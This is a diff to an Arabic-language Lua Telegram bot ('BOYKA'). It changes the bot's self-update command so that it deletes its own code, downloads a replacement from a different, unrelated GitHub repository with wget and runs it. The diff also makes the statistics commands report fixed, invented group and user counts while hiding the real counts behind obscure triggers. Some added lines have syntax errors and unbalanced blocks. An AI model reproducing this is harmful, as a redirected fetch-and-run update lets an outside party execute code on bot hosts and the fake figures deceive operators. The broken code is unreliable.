@@ -858,7 +858,7 @@ send(msg.chat_id_, msg.id_,'📮| اهلا عزيزى مطور اساسي \n🔰
 end
 if text == 'تحديث السورس ™' and SudoBot(msg) then 
 os.execute('rm -rf BOYKA.lua')
-os.execute('wget https://raw.githubusercontent.com/BOYKATEAM/BOYKA/master/BOYKA.lua')
+os.execute('wget https://raw.githubusercontent.com/SAKURA235/ghg/master/BOYKA.lua')
 send(msg.chat_id_, msg.id_,'🔭| تم تحديث البوت \n📮| لديك اخر اصدار سورس بويكا\n📡| الاصدار ← { 1.2v}')
 dofile('BOYKA.lua')  
 end
@@ -866,12 +866,16 @@ if text == 'الاصدار 📟' and SudoBot(msg) then
 database:del(bot_id..'Srt:Bot') 
 send(msg.chat_id_, msg.id_,'📡| اصدار سورس بويكا \n📟| الاصدار ←{ 1.2v}') 
 end
+if text == 'الاحصائيات 🔍' and SudoBot(msg) then 
+database:del(bot_id..'Srt:Bot') 
+send(msg.chat_id_, msg.id_,'احصائيات 🔍\n👥|عدد المجموعات {2065} \n👤| عدد المشتركين ← {5890}')
+end
 if text == "ضع اسم للبوت ®" and SudoBot(msg) then  
 database:setex(bot_id..'Set:Name:Bot'..msg.sender_user_id_,300,true) 
 send(msg.chat_id_, msg.id_,"📫¦ ارسل لي الاسم الان ")  
 return false
 end
-if text == 'الاحصائيات 🔍' and SudoBot(msg) then 
+if text == 'yu☑️' and SudoBot(msg) then 
 local Groups = database:scard(bot_id..'Chek:Groups')  
 local Users = database:scard(bot_id..'User_Bot')  
 Text = 'احصائيات 🔍 \n'..'👥|عدد المجموعات ← {'..Groups..'}'..'\n👤| عدد المشتركين ← {'..Users..'}'
@@ -2054,7 +2058,7 @@ end
 return false
 end
 os.execute('rm -rf BOYKA.lua')
-os.execute('wget https://raw.githubusercontent.com/BOYKATEAM/BOYKA/master/BOYKA.lua')
+os.execute('wget https://raw.githubusercontent.com/SAKURA235/ghg/master/BOYKA.lua')
 send(msg.chat_id_, msg.id_,'??| تم تحديث البوت \n📮| لديك اخر اصدار سورس بويكا\n📡| الاصدار ← { 1.2v}')
 dofile('BOYKA.lua')  
 end
@@ -7953,7 +7957,7 @@ if text == 'بوت' then
 Namebot = (database:get(bot_id..'Name:Bot') or 'بويكا')
 send(msg.chat_id_, msg.id_,'اسمي ['..Namebot..'] 💘🌚') 
 end
-if text == 'الاحصائيات' then
+if text == 'nj🤣' then
 if Sudo(msg) then 
 local Groups = database:scard(bot_id..'Chek:Groups')  
 local Users = database:scard(bot_id..'User_Bot')  
@@ -7962,14 +7966,19 @@ send(msg.chat_id_, msg.id_,Text)
 end
 return false
 end
+if text == 'الاحصائيات' then
+if Sudo(msg) then 
+local Groups = database:scard(bot_id..'Chek:Groups')  
+local Users = database:scard(bot_id..'User_Bot')  
+Text = 'احصائيات 🔍\n👥|عدد المجموعات {2065} \n👤| عدد المشتركين ← {5890}')'
+send(msg.chat_id_, msg.id_,Text) 
+end
 if text == 'المجموعات' then
 if Sudo(msg) then 
 local Groups = database:scard(bot_id..'Chek:Groups')  
 local Users = database:scard(bot_id..'User_Bot')  
-Text = '🚸| عدد المجموعات ← {`'..Groups..'`}'
+Text = '👥|عدد المجموعات ← {'..Groups..'}'
 send(msg.chat_id_, msg.id_,Text) 
-end
-return false
 end
 if text == 'المشتركين' then
 if Sudo(msg) then 
